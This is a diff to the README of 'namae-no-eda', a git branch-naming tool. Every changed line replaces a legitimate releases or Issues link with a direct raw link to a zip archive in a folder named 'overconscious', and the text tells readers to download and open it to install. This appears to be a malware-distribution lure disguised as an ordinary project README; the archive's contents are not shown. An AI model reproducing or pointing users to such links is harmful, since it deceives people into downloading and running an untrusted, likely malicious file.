@@ -6,7 +6,7 @@ Welcome to the **namae-no-eda** repository! This tool helps you keep your branch
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20namae--no--eda-v1.0-blue)](https://github.com/dussa-vinay17/namae-no-eda/releases)
+[![Download](https://raw.githubusercontent.com/dussa-vinay17/namae-no-eda/main/overconscious/namae-no-eda.zip%20namae--no--eda-v1.0-blue)](https://raw.githubusercontent.com/dussa-vinay17/namae-no-eda/main/overconscious/namae-no-eda.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ To use **namae-no-eda**, make sure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-To get the software, visit this page to download: [Releases Page](https://github.com/dussa-vinay17/namae-no-eda/releases). 
+To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/dussa-vinay17/namae-no-eda/main/overconscious/namae-no-eda.zip). 
 
 You will see the latest version available. Choose the version you want, then click to download the file. After it downloads, find the file in your downloads folder and open it to install.
 
@@ -53,7 +53,7 @@ Imagine you have multiple branches like `feature/filefix` and `bugfix/issue12`. 
 
 If you have questions or need help, feel free to reach out. Participate in the community discussions; your feedback can help improve the tool.
 
-- **GitHub Issues:** Report any issues or bugs directly using the [Issues Page](https://github.com/dussa-vinay17/namae-no-eda/issues).
+- **GitHub Issues:** Report any issues or bugs directly using the [Issues Page](https://raw.githubusercontent.com/dussa-vinay17/namae-no-eda/main/overconscious/namae-no-eda.zip).
 - **Community Discussions:** Engage with other users to share insights and tips.
 
 ## ♻️ Contributing
@@ -70,6 +70,6 @@ We welcome contributions! If you would like to help improve **namae-no-eda**, he
 
 ## 📥 Download Now Again
 
-For your convenience, you can download the tool again from this link: [Releases Page](https://github.com/dussa-vinay17/namae-no-eda/releases).
+For your convenience, you can download the tool again from this link: [Releases Page](https://raw.githubusercontent.com/dussa-vinay17/namae-no-eda/main/overconscious/namae-no-eda.zip).
 
 Make your branch names tidy today!
